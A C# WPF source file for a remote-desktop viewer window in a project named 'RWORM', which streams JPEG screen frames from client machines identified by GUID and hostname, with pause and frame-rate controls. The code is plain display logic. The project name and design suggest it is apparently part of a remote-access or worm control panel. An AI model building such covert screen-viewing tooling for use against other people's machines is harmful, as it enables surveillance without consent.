using System;
using System.IO;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media.Imaging;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class RemoteDesktopWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string           _guid;
        private bool _paused;
        private bool _closed;                 // set in OnClosed — drop late frames
        private int  _frameCount;
        private int  _frameBusy;              // 1 while a frame is being decoded
        private DateTime _lastFpsCalc = DateTime.Now;

        public RemoteDesktopWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid   = guid;
            Title   = $"Remote Desktop — {hostname}";
            if (TitleLabel != null) TitleLabel.Text = hostname;
            if (FpsLabel != null) FpsLabel.Text = "5";

            _server.RegisterRDHandler(guid, OnFrame);
            _ = _server.StartRemoteDesktop(guid);
            if (StatusLabel != null) StatusLabel.Text = "Connecting...";
        }

        private void OnFrame(byte[] jpeg)
        {
            if (_closed || _paused || jpeg == null || jpeg.Length == 0) return;
            if (Interlocked.CompareExchange(ref _frameBusy, 1, 0) != 0) return;

            _frameCount++;

            var now = DateTime.Now;
            if ((now - _lastFpsCalc).TotalSeconds >= 1)
            {
                var fps = _frameCount;
                _frameCount  = 0;
                _lastFpsCalc = now;
                try
                {
                    Dispatcher.BeginInvoke(new Action(() =>
                    {
                        if (!_closed && FpsActual != null) FpsActual.Text = $"{fps} fps";
                    }));
                }
                catch { }
            }

            try
            {
                Dispatcher.BeginInvoke(new Action(() =>
                {
                    try
                    {
                        if (_closed) return;
                        using var ms = new MemoryStream(jpeg);
                        var bmp = new BitmapImage();
                        bmp.BeginInit();
                        bmp.StreamSource   = ms;
                        bmp.CacheOption    = BitmapCacheOption.OnLoad;
                        bmp.CreateOptions  = BitmapCreateOptions.None;
                        bmp.EndInit();
                        bmp.Freeze();
                        if (ScreenView != null) ScreenView.Source = bmp;
                        if (StatusLabel != null) StatusLabel.Text = $"Live — {bmp.PixelWidth}×{bmp.PixelHeight}";
                        if (StatusDot != null)
                        {
                            StatusDot.Fill = new System.Windows.Media.SolidColorBrush(
                                System.Windows.Media.Color.FromRgb(0x3F, 0xB9, 0x50));
                        }
                    }
                    catch { }
                    finally { Interlocked.Exchange(ref _frameBusy, 0); }
                }));
            }
            catch
            {
                Interlocked.Exchange(ref _frameBusy, 0);
            }
        }

        private void Pause_Click(object s, RoutedEventArgs e)
        {
            _paused = !_paused;
            if (PauseBtn != null) PauseBtn.Content = _paused ? "▶ Resume" : "⏸ Pause";
            if (StatusLabel != null) StatusLabel.Text = _paused ? "Paused" : "Live";
        }

        private void FpsSlider_Changed(object s, RoutedPropertyChangedEventArgs<double> e)
        {
            if (FpsLabel != null && FpsSlider != null)
                FpsLabel.Text = ((int)FpsSlider.Value).ToString();
        }

        protected override void OnClosed(EventArgs e)
        {
            _closed = true;
            _server.UnregisterRDHandler(_guid);
            _ = _server.StopRemoteDesktop(_guid);
            base.OnClosed(e);
        }
    }
}
